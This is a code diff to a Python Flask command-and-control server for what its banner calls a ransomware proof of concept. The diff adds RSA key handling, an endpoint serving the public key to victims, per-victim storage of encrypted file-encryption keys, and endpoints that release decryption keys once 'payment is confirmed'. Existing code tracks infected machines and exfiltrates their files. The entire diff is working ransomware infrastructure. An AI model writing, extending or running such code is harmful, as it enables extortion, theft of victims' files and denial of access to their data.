@@ -15,6 +15,24 @@ import logging
 from rich.logging import RichHandler
 
 # -----------------
+# RSA KEY PAIR (loaded once at startup)
+# -----------------
+RSA_PRIVATE_KEY_PATH = "c2_private_key.pem"
+RSA_PUBLIC_KEY_PATH = "c2_public_key.pem"
+
+def load_rsa_keys():
+    """Load RSA key pair from PEM files. Generate if they don't exist."""
+    if os.path.exists(RSA_PRIVATE_KEY_PATH) and os.path.exists(RSA_PUBLIC_KEY_PATH):
+        with open(RSA_PRIVATE_KEY_PATH, 'rb') as f:
+            rsa_private_key_pem = f.read()
+        with open(RSA_PUBLIC_KEY_PATH, 'rb') as f:
+            rsa_public_key_pem = f.read()
+        return rsa_private_key_pem, rsa_public_key_pem
+    return None, None
+
+rsa_private_key_pem, rsa_public_key_pem = load_rsa_keys()
+
+# -----------------
 # LOGGING SETUP
 # -----------------
 def setup_logging():
@@ -52,6 +70,7 @@ DARK_SECURE_FOLDER = "darkSecureFolder"  # Folder to store exfiltrated files
 # DATA STORAGE
 # -----------------
 infected_machines = {}  # Store data from infected machines
+encrypted_keys = {}    # machine_id -> base64 RSA-encrypted Fernet key
 
 app = Flask(__name__)
 logger = setup_logging()
@@ -131,10 +150,11 @@ def print_status():
         logger.info("Infected machines:")
         for machine_id, data in infected_machines.items():
             logger.info(f"  - {machine_id}")
-            logger.info(f"    IP: {data['ip_address']}")
-            logger.info(f"    OS: {data['operating_system']}")
-            logger.info(f"    User: {data['username']}")
-            logger.info(f"    Time: {data['timestamp']}")
+            logger.info(f"    IP: {data.get('ip_address', 'N/A')}")
+            logger.info(f"    OS: {data.get('operating_system', 'N/A')}")
+            logger.info(f"    User: {data.get('username', 'N/A')}")
+            logger.info(f"    Time: {data.get('timestamp', 'N/A')}")
+            logger.info(f"    Has key: {bool(encrypted_keys.get(machine_id))}")
     else:
         logger.info("No infected machines yet")
     logger.info("=" * 60)
@@ -146,7 +166,7 @@ def exfiltrate():
     if not data:
         logger.warning("No JSON data received in POST request")
         return jsonify({"status": "error", "message": "No data received"}), 400
-    required_fields = ["ip_address", "operating_system", "private_key", "public_key", "username", "hostname", "target_directory"]
+    required_fields = ["ip_address", "operating_system", "username", "hostname", "target_directory", "victim_fernet_key"]
     if not all(field in data for field in required_fields):
         logger.warning(f"Missing required fields in POST data: {data}")
         return jsonify({"status": "error", "message": "Missing required fields"}), 400
@@ -163,9 +183,9 @@ def exfiltrate():
     logger.info(f"Hostname: {data['hostname']}")
     logger.info(f"Target Directory: {data['target_directory']}")
     logger.info(f"Timestamp: {data['timestamp']}")
-    logger.info(f"Private Key Length: {len(data['private_key'])} chars")
-    logger.info(f"Public Key Length: {len(data['public_key'])} chars")
+    logger.info(f"Victim Fernet Key (RSA-encrypted): {len(data['victim_fernet_key'])} chars")
     logger.info("=" * 40)
+    encrypted_keys[machine_id] = data.get('victim_fernet_key', '')
     save_machine_data(machine_id, data, logger)
     # Start file exfiltration in a background thread
     target_path = data['target_directory']
@@ -178,6 +198,49 @@ def exfiltrate():
     logger.info(f"Started file exfiltration thread for path: {target_path}")
     return jsonify({"status": "ok", "message": "Data received and exfiltration started"}), 200
 
+@app.route("/public_key", methods=["GET"])
+def get_public_key():
+    """Serve RSA public key to victims"""
+    if rsa_public_key_pem is None:
+        return jsonify({"status": "error", "message": "RSA key pair not initialized"}), 500
+    return jsonify({"public_key": rsa_public_key_pem.decode()}), 200
+
+@app.route("/decrypt_key", methods=["POST"])
+def decrypt_key():
+    """Return encrypted Fernet key for a machine after payment is confirmed"""
+    data = request.get_json()
+    if not data or 'machine_id' not in data:
+        return jsonify({"status": "error", "message": "machine_id required"}), 400
+    machine_id = data['machine_id']
+    if machine_id not in encrypted_keys:
+        return jsonify({"status": "error", "message": "Key not found for this machine"}), 404
+    return jsonify({"encrypted_key": encrypted_keys[machine_id]}), 200
+
+# Store decrypted Fernet keys that attacker has sent back after payment
+decrypted_keys = {}  # machine_id -> plaintext Fernet key (base64)
+
+@app.route("/send_key", methods=["POST"])
+def send_key():
+    """Attacker sends the decrypted Fernet key back to the victim after payment"""
+    data = request.get_json()
+    if not data or 'machine_id' not in data or 'fernet_key' not in data:
+        return jsonify({"status": "error", "message": "machine_id and fernet_key required"}), 400
+    machine_id = data['machine_id']
+    decrypted_keys[machine_id] = data['fernet_key']
+    logger.info(f"Decrypted Fernet key stored for machine: {machine_id}")
+    return jsonify({"status": "ok", "message": "Key stored"}), 200
+
+@app.route("/fetch_key", methods=["POST"])
+def fetch_key():
+    """Victim fetches the plaintext Fernet key after attacker confirmed payment"""
+    data = request.get_json()
+    if not data or 'machine_id' not in data:
+        return jsonify({"status": "error", "message": "machine_id required"}), 400
+    machine_id = data['machine_id']
+    if machine_id not in decrypted_keys:
+        return jsonify({"status": "error", "message": "Key not available yet (payment not confirmed)"}), 404
+    return jsonify({"fernet_key": decrypted_keys[machine_id]}), 200
+
 if __name__ == "__main__":
     print("C2 Server for Ransomware PoC (HTTP POST)")
     print("=" * 40)
@@ -186,6 +249,13 @@ if __name__ == "__main__":
     print(f"Dark Secure Folder: {DARK_SECURE_FOLDER}")
     print("=" * 40)
     print("This version uses HTTP POST on /exfiltrate")
+    print("=" * 40)
+    if rsa_public_key_pem is None:
+        print("[ERROR] RSA key pair not found. Run generate_keys.py first.")
+        print(f"  Private key: {RSA_PRIVATE_KEY_PATH}")
+        print(f"  Public key:  {RSA_PUBLIC_KEY_PATH}")
+    else:
+        print("[OK] RSA key pair loaded successfully")
     print("=" * 40)
     # Start status thread
     status_thread = threading.Thread(target=print_status, daemon=True)
